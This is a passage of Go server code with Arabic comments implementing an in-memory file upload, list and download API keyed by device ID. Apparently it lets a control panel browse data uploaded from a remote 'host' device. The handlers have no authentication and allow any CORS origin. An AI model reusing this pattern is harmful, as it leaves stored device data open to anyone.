			delete(blobData[deviceID], oldestKind)
		}
	}
}

func handleBlobAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Device-Id, X-Blob-Name, X-Blob-Sha")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	deviceID := r.URL.Query().Get("device")
	kind := r.URL.Query().Get("kind")
	name := r.URL.Query().Get("name")
	deviceID = strings.TrimSpace(deviceID)
	kind = strings.TrimSpace(kind)

	switch r.Method {
	case http.MethodPost:
		if deviceID == "" || kind == "" || name == "" {
			writeStateJSONError(w, http.StatusBadRequest, "device و kind و name مطلوبة في الرابط (query)")
			return
		}
		r.Body = http.MaxBytesReader(w, r.Body, blobMaxItem)
		data, err := io.ReadAll(r.Body)
		if err != nil {
			writeStateJSONError(w, http.StatusBadRequest, "فشل قراءة بيانات الملف")
			return
		}
		if len(data) == 0 {
			writeStateJSONError(w, http.StatusBadRequest, "ملف فارغ")
			return
		}
		sum := fmt.Sprintf("%x", sha256.Sum256(data))
		clientSha := strings.TrimSpace(r.Header.Get("X-Blob-Sha"))
		blobMu.Lock()
		defer blobMu.Unlock()
		prev, existed := blobData[deviceID][kind][name]
		if existed && prev.Sha256 == sum && clientSha == sum {
			// بلا تكرار: نفس المحتوى مرفوع مسبقاً — لا نزيده ولا نعيد تنزيل الرفع
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "dedup": true, "sha256": sum})
			return
		}
		if blobData[deviceID] == nil {
			blobData[deviceID] = map[string]map[string]*BlobItem{}
		}
		if blobData[deviceID][kind] == nil {
			blobData[deviceID][kind] = map[string]*BlobItem{}
		}
		item := &BlobItem{Name: name, Kind: kind, Sha256: sum, Size: int64(len(data)), Ts: time.Now().UnixMilli(), Data: data}
		if existed {
			item.Ts = prev.Ts // أول رفع يبقى كمرجع (استبعاد التكرار عند الجلب)
		}
		blobData[deviceID][kind][name] = item
		blobTrack(deviceID, item, prev)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "dedup": false, "sha256": sum, "size": item.Size})

	case http.MethodGet:
		if name == "" {
			// قائمة الملفات (استبعاد التكرار يعتمد على sha256 في القائمة نفسها)
			if deviceID == "" || kind == "" {
				writeStateJSONError(w, http.StatusBadRequest, "device و kind مطلوبتان في الرابط")
				return
			}
			blobMu.RLock()
			kinds := blobData[deviceID]
			var out []*BlobItem
			items, ok := kinds[kind]
			if ok {
				for _, it := range items {
					out = append(out, it)
				}
			}
			blobMu.RUnlock()
			sort.Slice(out, func(i, j int) bool { return out[i].Ts < out[j].Ts })
			w.Header().Set("Content-Type", "application/json")
			if out == nil {
				out = []*BlobItem{}
			}
			json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "items": out})
			return
		}
		if deviceID == "" || kind == "" {
			writeStateJSONError(w, http.StatusBadRequest, "device و kind مطلوبتان")
			return
		}
		blobMu.RLock()
		it, ok := blobData[deviceID][kind][name]
		blobMu.RUnlock()
		if !ok || it == nil {
			writeStateJSONError(w, http.StatusNotFound, "الملف غير موجود")
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", it.Name))
		w.Write(it.Data)

	default:
		writeStateJSONError(w, http.StatusMethodNotAllowed, "طريقة غير مدعومة")
	}
}

// B6: GET /api/blob/list?device=&kind= — قائمة أسماء الملفات المخزنة في ذاكرة خادم Render
// لنوع (kind) معين بدون محتوى الملف (العنصر يتضمن sha256 و ts و size).
// هذا هو المسار الذي تستعلمه لوحة التحكم لتصفح بيانات المضيف التي رُفعت
// عندما كان المضيف متصلاً بالإنترنت والمتحكم غير متصل.
func handleBlobListAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Device-Id, X-Blob-Name, X-Blob-Sha")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodGet {
		writeStateJSONError(w, http.StatusMethodNotAllowed, "طريقة غير مدعومة")
		return
	}
	deviceID := strings.TrimSpace(r.URL.Query().Get("device"))
	kind := strings.TrimSpace(r.URL.Query().Get("kind"))
	if deviceID == "" || kind == "" {
		writeStateJSONError(w, http.StatusBadRequest, "device و kind مطلوبتان في الرابط (query)")
		return
	}
	blobMu.RLock()
	var out []*BlobItem
	if items, ok := blobData[deviceID][kind]; ok {
		for _, it := range items {
			out = append(out, it)
		}
	}
	blobMu.RUnlock()
	sort.Slice(out, func(i, j int) bool { return out[i].Ts < out[j].Ts })
	w.Header().Set("Content-Type", "application/json")
	if out == nil {
		out = []*BlobItem{}
	}
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "items": out})
}
